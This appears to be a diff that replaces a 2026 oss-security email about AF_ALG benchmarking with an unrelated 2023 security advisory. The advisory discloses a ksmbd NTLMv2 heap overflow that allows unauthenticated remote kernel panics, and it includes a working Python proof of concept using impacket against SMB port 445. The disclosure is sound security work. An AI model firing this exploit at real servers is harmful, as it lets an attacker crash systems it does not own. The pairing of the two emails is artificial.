@@ -1,4 +1,4 @@
-Received: (qmail 17561 invoked by uid 550); 4 May 2026 16:07:34 -0000
+Received: (qmail 23864 invoked by uid 550); 4 Jan 2023 17:03:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,83 +7,103 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 3572 invoked from network); 4 May 2026 06:45:16 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1777877105;
-	bh=GcSGGqP6V1jmYg4gECCJk2Kfg0QcCDiEZx5H+wEc7IE=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=UsCoXrttsPit6HgPOtU7iRbzellEM+2VlWUSQ5NydY+4M/WTAMUdgRRhxMhUuP2/U
-	 bHjNlueA/hBk9QZra54g4CfT4LJ+YJppBUVFHYUWmzH1YoRPz0tGCp0fxKWyD7xDZA
-	 8L2ff37LYNQwvNetSESCbOpavjtezy5Decjwmb5N18zCZep2kKGLZ+d1h4ig+XRmlL
-	 iB8ZlvNS95X3PUel9tnOEVq3qEOFuIiE9x7v5M/ZNga92QGdRFeQpuN2poyot5lox4
-	 QZ0/B0bjMgoCgdoNASx/fujPma/BBR0FgLBbTiip2VbtteAM/SfD+YOTpked5y1Npr
-	 l/KxWr47lMTvg==
-Date: Sun, 3 May 2026 23:43:46 -0700
-From: Eric Biggers <ebiggers@kernel.org>
-To: Demi Marie Obenour <demiobenour@gmail.com>
-Cc: Milan Broz <gmazyland@gmail.com>, oss-security@lists.openwall.com,
-	Jan Schaumann <jschauma@netmeister.org>, iwd@lists.linux.dev
-Message-ID: <20260504064346.GA112568@sol>
-References: <afJorKIje4O6dXbH@netmeister.org>
- <d6111caa-db61-498a-92cb-ea7a0aa0a5e2@ehuk.net>
- <87se8dgicq.fsf@gentoo.org>
- <afL-QhLfEKqHZqka@eldamar.lan>
- <20260430071917.GB54208@sol>
- <177abb5d-8ba9-4bb9-8b23-9fbc868ed3cd@gmail.com>
- <20260501180028.GA2260@sol>
- <19837ef5-e5b6-45f4-8336-3ce07423dfb1@gmail.com>
- <021503ca-8a9b-4f9d-8b8e-81661572a018@gmail.com>
- <16a713ee-4cf3-4f40-a532-8a937eaffd21@gmail.com>
+Received: (qmail 32355 invoked from network); 4 Jan 2023 16:35:33 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:from:to:cc:subject:date:message-id:reply-to;
+        bh=DNRhKQwvF0hgVuojB/2UmmUU4hjmUmnk8Ylan4/F1aw=;
+        b=hppX39ETBhcojAWhSzQ6hPRgwr2yiD21GOBLrpc71gBew2YPx9doZKhfvgPvqopWh2
+         MBM+yyma23JgTr1QuhMl/2s++1t8/SIut3zCCrdcCRnreCMR6Z7Z2LzxrIgdEarpS6he
+         e9p+qsRWIgkq57zJQ0iXfrRLWAA/6MCMX1oNQx5clJA2k+0YlnPGfw+oQOXo7WMef6cA
+         GVbTKxlbcQDC5CKlCo2x4pNG0I65hoS0oeCkjWhfqupmWgaGW6EALV95tyafD5muH98t
+         P6FuoIo9yvOvGNzAy1+KG4F80bRRhPGjdPmKleTjqDwhpgBrHOwyAe3lUSMNZn1Ef5In
+         +Ajg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=DNRhKQwvF0hgVuojB/2UmmUU4hjmUmnk8Ylan4/F1aw=;
+        b=uy8d/G4Zp4VT4oOB2IEDPIpP6jQA336z0wvCENWmibhn31SRbfX17iNvgURtKDJpvq
+         +z9RnByaeE1KXy8LUeituR7Kp1bhQnkDiDDqrk4EDekFqH/kxfs7hxQk+Wg33ueQXeEU
+         KpbSJPx3Ri0cbgU1+gj3i+l33S2X1tfot6zpDxg0Lbm6LxeI86bh9f1LpA8PsK8ZXdzj
+         x2L7gMHlb83Wo292hyVJBduQk6nPDgwg7irRCaTTbmD/KRD9dS9wFQY5l8Bz/1nOg0Ey
+         3yMGkNcD6NfJ/0MNmnk1AwFJcQMHEJn39xZowZiROkrk6pMzCLiHW48Yl5dtE4O6Bufr
+         u54Q==
+X-Gm-Message-State: AFqh2koa4dZd3/EafQn2soF6jsFl2x2a8evhoG5kPrhbcDd1zhKm93UN
+	XlN1PwIx41aUmr0hIdk0JWFawAhbjFcwlWZMUNMYB7lhtnU=
+X-Google-Smtp-Source: AMrXdXtggoCF4adXOj3/Ull/4c16okKnilx/29PRiNPyJXkRrLTcs0iuprP1fgbjcwJNGn5svB/WZ/mQsTddC1gpgw4=
+X-Received: by 2002:a81:7044:0:b0:3d6:233b:7292 with SMTP id
+ l65-20020a817044000000b003d6233b7292mr5774656ywc.476.1672850120452; Wed, 04
+ Jan 2023 08:35:20 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <16a713ee-4cf3-4f40-a532-8a937eaffd21@gmail.com>
-Subject: Re: [oss-security] CVE-2026-31431: CopyFail: linux local privilege
- scalation
+From: =?UTF-8?B?SHJ2b2plIE1pxaFldGnEhw==?= <misetichrvoje@gmail.com>
+Date: Wed, 4 Jan 2023 17:35:09 +0100
+Message-ID: <CAGakKvz79Ey501w4LwNsMv4zj6LyYdagNyXWOrEt5Kus9xUmuQ@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Cc: will@willsroot.io
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+Subject: [oss-security] Linux kernel: Unauthenticated remote DOS in ksmbd NTLMv2 authentication
 
-On Mon, May 04, 2026 at 02:13:01AM -0400, Demi Marie Obenour wrote:
-> > - It is used for benchmarking, where we actually need kernel crypto.
-> > 
-> > As it will be used in real dm-crypt mapping later, benchmarking
-> > userspace lib just does not make sense.
-> > (Requiring CAP_SYS_ADMIN here is not such a big issue, and it is
-> > a very rough test - but useful for relative comparison, not for the
-> > real numbers.)
-> 
-> Would an API to ask the kernel to benchmark its own algorithms work
-> for this?  That would be a more accurate benchmark as it removes
-> syscall overhead.
+There is a heap overflow bug in ksmbd_decode_ntlmssp_auth_blob in which nt_=
+len
+can be less than CIFS_ENCPWD_SIZE. This results in a negative blen argument
+for ksmbd_auth_ntlmv2, where it calls memcpy using blen on memory allocated
+by kmalloc(blen + CIFS_CRYPTO_KEY_SIZE). Note that CIFS_ENCPWD_SIZE is 16
+and CIFS_CRYPTO_KEY_SIZE is 8. We believe this bug can only result in a
+remote DOS and not privilege escalation nor RCE, as the heap overflow occurs
+when blen is in range (-8, -1]. The resulting overflow will be too large,
+and will lead to a kernel panic. When blen is -8, kmalloc returns
+ZERO_SIZE_PTR which will cause a null dereference, but the kernel will oops
+and will usually continue to function. This bug has existed since 5.15-rc1
+and is still present in the upstream source tree, having just been patched
+in https://github.com/cifsd-team/ksmbd and is awaiting merging - the commit
+ID is 8824b7af409f51f1316e92e9887c2fd48c0b26d6.
 
-For what it's worth, I've always been frustrated by
-'cryptsetup benchmark' and the numbers that people report with it
-because they underestimate the fast algorithms so significantly.
+We have tested this bug on Ubuntu 20.04 HWE and 22.04 (both running on
+5.15.0-56-generic) and can remotely panic the OS immediately. Any attacker
+that can access the ksmbd SMB port can easily cause a kernel panic. Note th=
+at
+while the attacker has to know a valid username for the service, it does not
+need to know the password as the bug happens in the challenge-response phase
+of ntlmv2 protocol, making this an unauthenticated attack.
 
-For example, on my desktop (if I enable AF_ALG so that it works) it
-reports 15585 MiB/s for AES-256-XTS encryption.
+Below is a POC to trigger the bug.
+---------------------------------------------------------------------------=
+---
+#!/usr/bin/python3
+from impacket.smbconnection import SMBConnection
+import functools
+import impacket.ntlm
 
-Yet, a userspace port of the kernel's VAES+AVX512 optimized AES-256-XTS
-assembly code runs at 33600 MiB/s: over twice as fast.
+# using impacket-0.10.0
 
-(Yes, encryption is that fast now on the newer AMD processors.)
+user =3D "test"
+pw =3D "test"
+domain =3D "localhost"
+address =3D "127.0.0.1"
+target_ip =3D "127.0.0.1"
+port =3D "445"
 
-So in this case most of the time is spent in AF_ALG overhead, not the
-actual algorithm that the benchmark is supposed to be measuring.
+def post_function(function, postfunction):
+    @functools.wraps(function)
+    def run(*args, **kwargs):
+        resp =3D function(*args, **kwargs)
+        return postfunction(resp)
+    return run
 
-(And this is yet another example of why going through AF_ALG instead of
-just calling a userspace crypto library isn't very efficient...)
+def post_computeResponseNTLMv2_hook(resp):
+    return ('A' * 10, resp[1], resp[2])
 
-I know the cryptsetup folks consider this tolerable since 'cryptsetup
-benchmark' is meant to be a rough estimate anyway.  But I think it
-clearly shows that AF_ALG has never been all that great for the
-"benchmarking the kernel's crypto code" use case, either.
+impacket.ntlm.computeResponseNTLMv2 =3D post_function(
+    impacket.ntlm.computeResponseNTLMv2, post_computeResponseNTLMv2_hook)
 
-In the case of benchmarking done during kernel development, we've
-actually already been solving that in a different way: adding KUnit
-tests with benchmarks included.
-
-But for benchmarking by end users, yes, I suppose if really needed it
-could be done using a new UAPI.  It would just provide the speed of each
-algorithm and nothing else.
-
-- Eric
+smbClient =3D SMBConnection(address, target_ip, port)
+smbClient.login(user, pw, domain)
+---------------------------------------------------------------------------=
+---
+Best,
+Hrvoje Mi=C5=A1eti=C4=87
+William Liu
